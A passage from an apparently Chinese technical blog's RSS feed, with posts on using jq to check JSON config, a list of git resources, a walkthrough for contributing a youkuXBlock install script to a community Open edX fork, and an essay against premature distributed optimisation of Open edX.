class="nt"&gt;&amp;quot;mailing_address&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;email&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;wwj@example.com&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;date_joined&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;2015-05-13T09:42:45Z&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;原文输出(格式化json)&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;cat  ./account.json|jq '.'&lt;/code&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;quot;username&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;wwj&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;quot;bio&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;quot;requires_parental_consent&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;quot;name&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;wwj&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;quot;country&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;quot;is_active&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;quot;profile_image&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;image_url_full&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;http://example.com/static/images/default-theme/default-profile_500.de2c6854f1eb.png&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;image_url_large&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;http://example.com/static/images/default-theme/default-profile_120.33ad4f755071.png&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;image_url_medium&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;http://example.com/static/images/default-theme/default-profile_50.5fb006f96a15.png&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;image_url_small&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;http://example.com/static/images/default-theme/default-profile_30.ae6a9ca9b390.png&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;has_image&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;false&lt;/span&gt;
  &lt;span class="p"&gt;},&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;quot;year_of_birth&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;quot;level_of_education&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;quot;goals&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;quot;language_proficiencies&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;[],&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;quot;gender&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;quot;mailing_address&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;quot;email&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;wwj@example.com&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;quot;date_joined&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;2015-05-13T09:42:45Z&amp;quot;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;过滤&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;cat  ./account.json|jq '.profile_image'&lt;/code&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;quot;image_url_full&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;http://example.com/static/images/default-theme/default-profile_500.de2c6854f1eb.png&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;quot;image_url_large&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;http://example.com/static/images/default-theme/default-profile_120.33ad4f755071.png&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;quot;image_url_medium&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;http://example.com/static/images/default-theme/default-profile_50.5fb006f96a15.png&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;quot;image_url_small&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;http://example.com/static/images/default-theme/default-profile_30.ae6a9ca9b390.png&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;quot;has_image&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;false&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;如果key不存在则返回null&lt;/p&gt;
&lt;p&gt;&lt;code&gt;cat  ./account.json|jq '.testname'&lt;/code&gt; 返回null&lt;/p&gt;
&lt;h3&gt;支持嵌套&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;cat  ./account.json|jq '.profile_image.image_url_full'&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;"http://example.com/static/images/default-theme/default-profile_500.de2c6854f1eb.png"&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;语法检查&lt;/h3&gt;
&lt;p&gt;cat test.json&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;a&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;a&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="err"&gt;ddd&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;b&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;b&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;c&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;c&amp;quot;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;code&gt;cat test.json | jq '.'&lt;/code&gt;返回&lt;code&gt;parse error: Invalid numeric literal at line 3, column 8&lt;/code&gt;&lt;/p&gt;
&lt;h2&gt;在线体验&lt;/h2&gt;
&lt;p&gt;&lt;a href="https://jqplay.org/"&gt;jqplay.org&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;上手&lt;/h2&gt;
&lt;p&gt;&lt;a href="https://stedolan.github.io/jq/tutorial/"&gt;Tutorial&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;文档&lt;/h2&gt;
&lt;p&gt;&lt;a href="https://stedolan.github.io/jq/manual/"&gt;manual&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;进阶&lt;/h2&gt;
&lt;p&gt;&lt;a href="https://github.com/stedolan/jq/wiki/Cookbook"&gt;Cookbook&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;在edx-platform中使用&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;/edx/app/edxapp/*.*.json&lt;/code&gt;用于覆盖aws.py和devstack.py里的配置参数，为用户配置edx提供了便利，但是由于缺乏语法检查一个小失误（诸如漏了逗号，漏了引号），就会造成edx启动失败，而且错误信息几乎无法定位。&lt;/p&gt;
&lt;p&gt;有了jq，可以方便地检查语法以及查看参数&lt;/p&gt;
&lt;p&gt;如果我们把jq当做处理json数据的sed，还可以方便用来写配置edx的脚本&lt;/p&gt;
&lt;h3&gt;我的实践&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://blog.just4fun.site/use-qingcloud-cli-contral-qingcloud.html"&gt;使用命令行操作青云&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.just4fun.site/edx-data-migrate.html"&gt;edx数据迁移&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Thu, 29 Oct 2015 00:00:00 +0000</pubDate><guid>tag:,2015-10-29:command-tool-jq.html</guid><category>dev-tools</category></item><item><title>git资源汇集</title><link>/git-resource-summary.html</link><description>&lt;h1&gt;动机&lt;/h1&gt;
&lt;p&gt;对git的一些资源进行汇总。&lt;/p&gt;
&lt;p&gt;不作为教程使用 :)&lt;/p&gt;
&lt;p&gt;对熟悉git的你可能会有帮助&lt;/p&gt;
&lt;p&gt;本来想把常用的指令一一列出，后来觉得不如用人家做好的git cheat sheet呀，于是本文的写作动机定位为：作为自己日常使用git的资源入口&lt;/p&gt;
&lt;h1&gt;git的操作流程&lt;/h1&gt;
&lt;p&gt;&lt;img alt="git1" src="img/git/git1.jpeg" /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="git2" src="img/git/git2.jpeg" /&gt;&lt;/p&gt;
&lt;h1&gt;cheat sheet&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/ArslanBilal/Git-Cheat-Sheet/blob/master/other-sheets/git-cheat-sheet-zh.md"&gt;git-cheat-sheet-zh&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/tiimgreen/github-cheat-sheet/blob/master/README.zh-cn.md"&gt;github-cheat-sheet-zh&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://static.oschina.net/uploads/img/201210/15181332_I4p6.jpg"&gt;git命令思维导图&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;工作流&lt;/h1&gt;
&lt;p&gt;&lt;a href="https://github.com/xirong/my-git/blob/master/git-workflow-tutorial.md"&gt;Git工作流指南&lt;/a&gt;
*  &lt;a href="https://github.com/nvie/gitflow"&gt;gitflow&lt;/a&gt;
    *  我的使用案例:&lt;a href="https://github.com/wwj718/jobsVisualization/blob/master/gitflow_dev_note.md"&gt;gitflow_dev_note&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;小工具&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/github/gitignore"&gt;gitignore&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/tj/git-extras"&gt;git-extras&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/tj/git-extras/blob/master/Commands.md"&gt;Go to Commands page for basic usage and examples&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/git-up/GitUp"&gt;GitUp&lt;/a&gt; : 用于编辑commit，以及分支观察&lt;/li&gt;
&lt;li&gt;&lt;a href=""&gt;tig&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;diff&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/so-fancy/diff-so-fancy"&gt;diff-so-fancy&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/jeffkaufman/icdiff"&gt;icdiff&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;merge&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/mhagger/git-imerge"&gt;git-imerge&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;理解git的资料&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://git-scm.com/book/zh/v2"&gt;Pro Git book&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://marklodato.github.io/visual-git-guide/index-zh-cn.html"&gt;图解Git&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/pcottle/learnGitBranching"&gt;learnGitBranching&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;git style guide&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/aseaday/git-style-guide"&gt;git-style-guide&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;相关服务&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com"&gt;github&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://git.oschina.net/"&gt;Git@OSC&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/gitlabhq/gitlabhq"&gt;gitlab&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/gogits/gogs"&gt;gogs&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/sitaramc/gitolite"&gt;gitolite&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;git周边&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/gollum/gollum"&gt;gollum&lt;/a&gt;:A simple, Git-powered wiki with a sweet API and local frontend.&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/FredrikNoren/ungit"&gt;ungit&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/tpope/vim-fugitive"&gt;vim-fugitive&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/bup/https://github.com/bup/bup"&gt;bup&lt;/a&gt;:基于git的备份跟工具&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 28 Oct 2015 00:00:00 +0000</pubDate><guid>tag:,2015-10-28:git-resource-summary.html</guid><category>技术</category></item><item><title>在社区版中集成youku插件(作为社区协作的一个演示案例)</title><link>/install-youkuXblock-into-edx.html</link><description>&lt;h1&gt;目的&lt;/h1&gt;
&lt;p&gt;这篇文章将以一个真实的案例，演示如何基于github，展开社区协作。&lt;/p&gt;
&lt;p&gt;案例为:在社区版中集成&lt;a href="https://github.com/wwj718/youkuXBlock"&gt;youkuXblock&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;开发环境（社区版edx_cypress_docker）&lt;/h1&gt;
&lt;p&gt;开发环境的安装和使用,可以参考我此前的文章：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://wwj718.github.io/edx-cypress-cn-install-and-use.html"&gt;Open edX中国社区Docker版安装使用&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://wwj718.github.io/edx-cypress-cn-for-deveiopment.html"&gt;使用Open edX中国社区Docker版来开发调试edX&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ps:使用devstack开发的同学，大体协作流程是相同的，仅是最初进入到开发环境的入口不同&lt;/p&gt;
&lt;h1&gt;fork社区版的源码&lt;/h1&gt;
&lt;p&gt;登录你的github账户，fork社区版的源码:&lt;a href="https://github.com/easy-edx/edx-platform"&gt;easy-edx/edx-platform&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;fork完之后，你得到一个自己的镜像。好比我的演示用户为edxDev（用户名），那么我将得到：
&lt;img alt="fork" src="img/edx/edxcn/fork.png" /&gt;&lt;/p&gt;
&lt;h1&gt;workflow&lt;/h1&gt;
&lt;p&gt;下边我们就进入了正式开发流程&lt;/p&gt;
&lt;h2&gt;克隆自己的源码镜像&lt;/h2&gt;
&lt;p&gt;git clone -b edx_cn/cypress_cn https://github.com/edxDev/edx-platform.git&lt;/p&gt;
&lt;h2&gt;建立自己的功能分支&lt;/h2&gt;
&lt;p&gt;分支命名：规则为&lt;yourname&gt;/&lt;feature&gt;，feature应当能代表分支的功能/特性,在这里，我的用户名为edxDev，feature是为了添加youku支持，于是命名为edxDev/youkuXblock&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nb"&gt;cd&lt;/span&gt; edx-platform
git checkout -b edxDev/youkuXblock edx_cn/cypress_cn
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;这样你就建立了基于edx_cn/cypress_cn（社区版）的分支了&lt;/p&gt;
&lt;h2&gt;开始开发&lt;/h2&gt;
&lt;h3&gt;将开发环境跑起来&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;sudo docker run -itd -p 5000:5000 -p 5010:5010 -p 2022:22 -v ~/edx-platform:/edx/app/edxapp/edx-platform-dev wwj718/edx_cypress_docker:1.21&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;注：当前edx_cypress_docker最新的社区版为1.21（感谢edustack贡献的完整语言包！）&lt;/p&gt;
&lt;h3&gt;进入开发环境，做开发&lt;/h3&gt;
&lt;p&gt;使用ssh或是docker exec进入开发环境&lt;/p&gt;
&lt;p&gt;在&lt;code&gt;/edx/app/edxapp/edx-platform-dev/edx_cn_feature&lt;/code&gt;中添加新特性（采用脚本式的安装）。至于如何修改比较自由，原则是尽量不要侵入源码，而采取增量式的改变&lt;/p&gt;
&lt;p&gt;在&lt;code&gt;/edx/app/edxapp/edx-platform-dev/edx_cn_feature&lt;/code&gt;目录下增加&lt;code&gt;youkuXblock_install.sh&lt;/code&gt;,内容为&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;/edx/app/edxapp/venvs/edxapp/bin/pip install git+https://github.com/wwj718/youkuXBlock.git
sed &lt;span class="s1"&gt;&amp;#39;/&amp;quot;FEATURES&amp;quot;: {/a\        &amp;quot;ALLOW_ALL_ADVANCED_COMPONENTS&amp;quot;: true,&amp;#39;&lt;/span&gt;  -i /edx/app/edxapp/cms.env.json
&lt;span class="c1"&gt;#sudo /edx/bin/supervisorctl restart edxapp:&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;code&gt;chmod +x /edx/app/edxapp/edx-platform-dev/edx_cn_feature/youkuXblock_install.sh&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;之后执行&lt;code&gt;./youkuXblock_install.sh&lt;/code&gt;，特性添加完毕&lt;/p&gt;
&lt;p&gt;调试后发现一切正常，就可以提交代码到社区啦&lt;/p&gt;
&lt;p&gt;&lt;img alt="youku.png" src="img/edx/edxcn/youku.png" /&gt;&lt;/p&gt;
&lt;h3&gt;提交修改&lt;/h3&gt;
&lt;p&gt;在docker里的话，先做好git user配置&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;  git config --global user.email &lt;span class="s2"&gt;&amp;quot;xxx@qq.com&amp;quot;&lt;/span&gt;
  git config --global user.name &lt;span class="s2"&gt;&amp;quot;edxDev&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;用git提交代码&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nb"&gt;cd&lt;/span&gt; /edx/app/edxapp/edx-platform-dev
git add /edx/app/edxapp/edx-platform-dev/edx_cn_feature/youkuXblock_install.sh
git commit -m &lt;span class="s1"&gt;&amp;#39;add youkuXblock_install.sh to use youku in edx&amp;#39;&lt;/span&gt;
git push origin edxDev/youkuXblock:edxDev/youkuXblock
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;在github上发起pull requests（请求合并到社区）&lt;/h3&gt;
&lt;p&gt;&lt;img alt="pull_request1.png" src="img/edx/edxcn/pull_request1.png" /&gt;
&lt;img alt="pull_request2.png" src="img/edx/edxcn/pull_request2.png" /&gt;
&lt;img alt="pull_request3.png" src="img/edx/edxcn/pull_request3.png" /&gt;&lt;/p&gt;
&lt;p&gt;最后提交就行啦&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 28 Oct 2015 00:00:00 +0000</pubDate><guid>tag:,2015-10-28:install-youkuXblock-into-edx.html</guid><category>edx</category></item><item><title>about Open edx distributed</title><link>/about-open-edx-distributed.html</link><description>&lt;blockquote&gt;
&lt;p&gt;premature optimization is the root of all evil. --Donald Knuth&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;过早优化&lt;/h2&gt;
&lt;p&gt;似乎每个准备用Open edX的人，在安装尚未完成，用户还没注册，workflow还未确定，就开始担忧，如何分布式部署Open edX，以便能大规模应用呢？就好像明天用户就要破百万，后天完成第二轮融资，不提早考虑好，万一火了，多对不起排着队上课的同学呀&lt;/p&gt;
&lt;p&gt;哈哈，没有开刷各位的意思，我自己一开始就是这样的（羞涩脸）&lt;/p&gt;
&lt;p&gt;尽早考虑架构的问题当然是好的。毕竟一旦下手，生米煮成熟饭，再要调整就难了。&lt;/p&gt;
&lt;h2&gt;Why not？&lt;/h2&gt;
&lt;p&gt;不是说未雨绸缪有多不好，毕竟大家都觉得有备无患嘛，只是在Open edX中你不需要过早地担忧这些，Open edX采用了SOA风格的架构，RESTful风格的接口，基本是天生支持分布式的，这些都可以动态调整，初期不予考虑并但不影响你后期的扩展，而且你起步阶段还会敏捷许多&lt;/p&gt;
&lt;p&gt;而一来就考虑分布式的问题，分散了精力不说，更要命的是：你其实不知道系统的瓶颈在哪里，你没有真实的使用场景，怎么知道压力在那里呢？&lt;/p&gt;
&lt;p&gt;是分离数据库好呢，还是多搞几台缓存服务器好，如果优化mongo的话，cluster又该准备几个。&lt;/p&gt;
&lt;p&gt;而后你发现，真实使用场景是在学校内部使用，学生集中在晚上8-9点，主要是看视频，而你折腾了半天mysql主从数据库，考虑了读写分离，同步延迟等问题，不是在闹么。。。读数据的压力缓存完全能应对，而视频流服务又独立于edx。&lt;/p&gt;
&lt;p&gt;脱离实际使用场景的优化，都是耍流氓。&lt;/p&gt;
&lt;h2&gt;定心丸&lt;/h2&gt;
&lt;p&gt;edX的架构风格有很浓郁的SOA风味，核心组件的接口都是RESTful风格。几乎天然为分布式做足了考虑。它允许我们敏捷得构建起服务，等到负载压力大了，找到瓶颈后再动态调整来应对。&lt;/p&gt;
&lt;p&gt;对REST架构的扩展性有兴趣的同学，可以去翻阅Roy Thomas Fielding博士那篇著名的博士论文。那篇论文有中文版，我用了整个周末才读完 orz&lt;/p&gt;
&lt;p&gt;ps：Roy这篇论文的结尾处，引用的一段，动人极了，二度引用以提升逼格&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;我们每个人在内心深处都怀有一个梦想:希望创造出一个鲜活的世界,一个宇宙。那些
处在我们生活中心、受到过专业训练的架构师们,都怀有这样的渴望:在某一天,在某个地方,因为某种原因,我要创造出一个不可思议的、美丽的、夺人心魄的场所,在那里人们可以漫步,可以梦想,历经很多世纪生生不息。  ——Christopher Alexander&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;原文更是动人&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Each one of us has, somewhere in his heart, the dream to make a living world, a universe. Those of us who have been trained as architects have this desire perhaps at the very center of our lives: that one day, somewhere, somehow, we shall build one building which is wonderful, beautiful, breathtaking, a place where people can walk and dream for centuries.  -- Christopher Alexander &lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;实验&lt;/h2&gt;
&lt;p&gt;为了让大家宽心，我这两天在青云上做了如下实验&lt;/p&gt;
&lt;p&gt;先以原生部署的方式，部署在单机（就是按官方wiki的的&lt;a href="https://github.com/edx/configuration/wiki/edX-Ubuntu-12.04-64-bit-Installation"&gt;这个文档&lt;/a&gt;部署），而后假设用户暴涨, 然后我发现，这群人不知怎么搞的，读写很频繁，数据库压力挺大的，我最好把数据库分离出来。&lt;br /&gt;
话说用户暴涨的话，我不是该出任CEO迎娶白富美去了么，哪还写代码啊摔，哎想想还有点紧张。&lt;/p&gt;
&lt;p&gt;我说干就干，参考了&lt;a href="https://github.com/edx/configuration/wiki/Preparation-For-Production-Launch"&gt;Preparation For Production Launch&lt;/a&gt;，在两台独立的机器上部署好了数据库，给与了相关的用户权限（为了方便，我都用了root，习惯不好囧），允许了外部访问，又在青云里设好了防火墙，之后修改了原先机器上（跑着edxapp）的配置，主要是各个*.auth.json文件里DATABASES相关的配置，指向新的数据库位置&lt;/p&gt;
&lt;p&gt;然后把原先的数据导出再倒入到新数据库中，restart edxapp，一切OK！&lt;/p&gt;
&lt;p&gt;主从数据库之类的还没做，参考网上的资料和&lt;a href="https://github.com/dhasthagheer/edx-distributed-configuration"&gt;这个项目&lt;/a&gt;，做主从数据库是不麻烦的&lt;/p&gt;
&lt;p&gt;分离其他组件就更容易了，基本就是用ansible在相关机器上跑对应role，然后再运行edxapp的机器上配置好ip:port。把服务视为无状态为好，这样最有利于分离，而后分布&lt;/p&gt;
&lt;h2&gt;关于瓶颈&lt;/h2&gt;
&lt;p&gt;前边我们提到，在真实的环境中找到性能瓶颈是关键，这是漏水最多的短板。&lt;/p&gt;
&lt;p&gt;说来惭愧，这里分享下前车之鉴，我自己维护的平台，由于手写了比较多mongo查询，性能瓶颈都集中在这里了。达到过500%的负载，我也不知道这是什么鬼（服务器性能很好）&lt;/p&gt;
&lt;p&gt;通过合适地采用缓存，完全消解了这个问题&lt;/p&gt;
&lt;p&gt;所以，如果你写了很多自己的逻辑，尤其是大量与数据库打交道，做好缓存，做好缓存，做好缓存，重要的话说三遍。&lt;/p&gt;
&lt;p&gt;就酱&lt;/p&gt;
&lt;h2&gt;未来&lt;/h2&gt;
&lt;p&gt;如果你真的关心分布式，我是说真的关心，而不是玩票，好比你有一堆硬件，一堆资金，想据此提供云服务，有几个项目你可能会感兴趣&lt;/p&gt;
&lt;p&gt;edX的分布式，当前官方只给出基于亚马逊云的分布式部署方案。此外也有几个很引人注目的项目，一个是官方开始倾注力量到docker中，这个可以在roadmap和黑客马拉松中看到进展和计划。当然不只是官方，appsembler团队在这条路上已经走得很远了，他们甚至尝试性地给出了基于kubernetes的方案&lt;/p&gt;
&lt;p&gt;另一个是&lt;a href="https://www.hastexo.com/hastexo-integrates-openstack-open-edx"&gt;这里&lt;/a&gt;，hastexo正在将OpenStack技术用于Open edX&lt;/p&gt;
